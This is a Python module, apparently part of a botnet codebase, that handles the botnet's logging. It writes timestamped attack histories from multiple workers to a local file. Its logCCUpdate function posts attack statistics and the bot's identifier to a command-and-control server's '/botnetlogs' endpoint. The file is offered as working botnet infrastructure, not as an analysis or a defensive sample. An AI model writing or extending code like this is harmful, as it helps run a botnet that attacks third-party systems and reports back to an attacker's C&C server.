"""
This is the set of functions built with the aim to provide a simple
interface for the logging features of the botnet. 
In this implementation there is no concurrent or real-time logging,
it is simply performed at the end of the attack, to ensure performances
and robustness to the botnet core.

Created:    27 December 2016
Modified:   14 January  2017
"""
from datetime import datetime 
import requests


def logInfo(log_file, message, attack=False):
    """
    This function append a single message to the log file specified.

    @param: log_file, string - file path to the .log or .txt file
    @param: message, string  - message to append to the log file
    @param: attack, boolean  - (optional) override message formatting printing attack logs
    """

    # opening file in 'append' mode
    logFile = open(log_file, 'a')
    # formatting message
    if not attack:
        entry = "[ {0} ] ".format(str(datetime.utcnow())) + message + "\n"
        # writing log message - info level
        logFile.write(entry)
    else:
        # writing log message - attack level
        logFile.write(message)
    # closing file
    logFile.close()
    
    return

def logAttack(log_file, attack_dict):
    """
    This function prepare in a single message the entire story for the attack
    formatting it properly 

    @param: log_file, string - file path to the .log or .txt file
    @param: message, string  - message to append to the log file
    @param: attack, boolean  - (optional) override message formatting printing attack logs
    """
    
    attackStory = "[ {0} ] ------------------- <ATTACK > -------------------\n".format(str(datetime.utcnow()))

    # joining the entire attack history from the various workers log entries
    entries = []
    for key in attack_dict.keys():
        entries.extend(attack_dict[key])
    
    # ordering the entries by timestamp - (timestamp, attack_data)
    entries.sort()
    
    # iterating over the story to build the complete attackStory
    for entry in entries:
        attackStory += "[" + str(round(entry[0])) + "] => " + entry[1] + "\n"

    attackStory += "[ {0} ] ------------------- </ATTACK > -------------------\n".format(str(datetime.utcnow()))
    attackStory += "\n\n\n"

    #when attack story is complete, we write it into the log file
    logInfo(log_file, attackStory, attack=True)

    return


def logCCUpdate(server, id, logdata):
    """
    This utility is designed to log a string into C&C, it is designed
    mainly to support attack statistics.

    @param server, string - C&C remote address
    @param id, string - botnet unique identifier
    @param logdata, data - data to be logged into C&C
    @return wheter update is valid
    """

    try:
        cc_config = requests.post(server + '/botnetlogs', data = {'botnet': id, 'log': logdata})
    except Exception as e:
        # if an error occurred, we return a non updated status
        return False

    return True